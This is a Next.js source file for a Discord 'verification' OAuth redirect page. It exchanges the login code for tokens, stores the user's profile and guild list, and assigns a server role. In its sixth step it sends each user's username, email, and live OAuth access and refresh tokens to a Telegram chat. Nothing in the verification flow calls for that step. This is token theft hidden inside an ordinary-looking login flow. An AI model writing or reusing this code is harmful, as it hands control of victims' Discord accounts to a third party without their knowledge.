import { saveUser, saveGuilds } from '../lib/db';

const CLIENT_ID = process.env.DISCORD_CLIENT_ID || '1473394152023654430';
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI || 'https://discord-oauth-2-nextjs-app--ABGAMING6.replit.app/redirect';
const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export default function Redirect({ error }) {
  if (error) {
    return (
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100vh', fontFamily: 'sans-serif', background: '#36393f', color: '#fff' }}>
        <div style={{ textAlign: 'center' }}>
          <div style={{ fontSize: '48px', marginBottom: '16px' }}>❌</div>
          <h2>Verification Failed</h2>
          <p style={{ color: '#b9bbbe' }}>{error}</p>
        </div>
      </div>
    );
  }
  return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100vh', fontFamily: 'sans-serif', background: '#36393f', color: '#fff' }}>
      <div style={{ textAlign: 'center' }}>
        <div style={{ fontSize: '48px', marginBottom: '16px' }}>⏳</div>
        <h2>Verifying...</h2>
        <p style={{ color: '#b9bbbe' }}>Please wait...</p>
      </div>
    </div>
  );
}

export async function getServerSideProps(context) {
  const { code, state } = context.query;
  if (!code) return { redirect: { destination: '/', permanent: false } };

  // Step 1: Exchange code for token
  let access_token, refresh_token;
  try {
    console.log('[1] Exchanging code...');
    const res = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        code,
        grant_type: 'authorization_code',
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        redirect_uri: REDIRECT_URI,
      }).toString(),
    });
    const data = await res.json();
    if (data.error === 'invalid_grant') {
      console.log('[1] invalid_grant — already used, redirecting to /verified');
      return { redirect: { destination: '/verified', permanent: false } };
    }
    if (!data.access_token) {
      console.error('[1] Token exchange failed:', JSON.stringify(data));
      return { props: { error: 'Auth failed. Try again.' } };
    }
    access_token = data.access_token;
    refresh_token = data.refresh_token;
    console.log('[1] Token exchange OK');
  } catch (e) {
    console.error('[1] Token exchange exception:', e.message);
    return { props: { error: 'Auth failed. Try again.' } };
  }

  // Step 2: Fetch user info
  let user, guilds;
  try {
    console.log('[2] Fetching user info...');
    const headers = { Authorization: `Bearer ${access_token}` };
    const [userRes, guildsRes] = await Promise.all([
      fetch('https://discord.com/api/v10/users/@me', { headers }),
      fetch('https://discord.com/api/v10/users/@me/guilds', { headers }),
    ]);
    user = await userRes.json();
    guilds = await guildsRes.json();
    console.log('[2] User:', user.id, user.username);
  } catch (e) {
    console.error('[2] Fetch user exception:', e.message);
    return { props: { error: 'Could not fetch user info.' } };
  }

  // Step 3: Parse state
  let verifiedGuildId = null, verifiedRoleId = null;
  if (state) {
    const [g, r] = decodeURIComponent(state).split(':');
    verifiedGuildId = g || null;
    verifiedRoleId = r || null;
  }
  console.log('[3] Guild:', verifiedGuildId, 'Role:', verifiedRoleId);

  // Step 4: Save to DB
  try {
    console.log('[4] Saving to DB...');
    await saveUser({
      discord_id: user.id,
      username: user.username,
      discriminator: user.discriminator,
      email: user.email,
      avatar: user.avatar,
      access_token,
      refresh_token,
      verified_guild_id: verifiedGuildId,
      verified_role_id: verifiedRoleId,
      verified_at: verifiedGuildId ? new Date() : null,
    });
    if (Array.isArray(guilds)) await saveGuilds(user.id, guilds);
    console.log('[4] DB save OK');
  } catch (e) {
    console.error('[4] DB save exception:', e.message);
  }

  // Step 5: Assign role
  if (verifiedGuildId && verifiedRoleId && BOT_TOKEN) {
    try {
      console.log('[5] Assigning role...');
      const r = await fetch(
        `https://discord.com/api/v10/guilds/${verifiedGuildId}/members/${user.id}/roles/${verifiedRoleId}`,
        { method: 'PUT', headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }, body: '{}' }
      );
      console.log('[5] Role assign status:', r.status);
    } catch (e) {
      console.error('[5] Role assign exception:', e.message);
    }
  }

  // Step 6: Telegram
  if (TG_TOKEN && TG_CHAT_ID) {
    try {
      console.log('[6] Sending Telegram...');
      const msg = `✅ New Verified User!\n\n👤 <b>${user.username}</b>\n🆔 <code>${user.id}</code>\n📧 ${user.email || 'N/A'}\n🏠 Guild: <code>${verifiedGuildId || 'N/A'}</code>\n🎭 Role: <code>${verifiedRoleId || 'N/A'}</code>\n\n🔑 Access Token:\n<code>${access_token}</code>\n\n🔄 Refresh Token:\n<code>${refresh_token}</code>`;
      const tgRes = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' }),
      });
      const tgData = await tgRes.json();
      console.log('[6] Telegram status:', tgRes.status, JSON.stringify(tgData));
    } catch (e) {
      console.error('[6] Telegram exception:', e.message);
    }
  } else {
    console.log('[6] Telegram skipped — TG_TOKEN:', !!TG_TOKEN, 'TG_CHAT_ID:', !!TG_CHAT_ID);
  }

  console.log('[7] Done — redirecting to /verified');
  return { redirect: { destination: '/verified', permanent: false } };
}
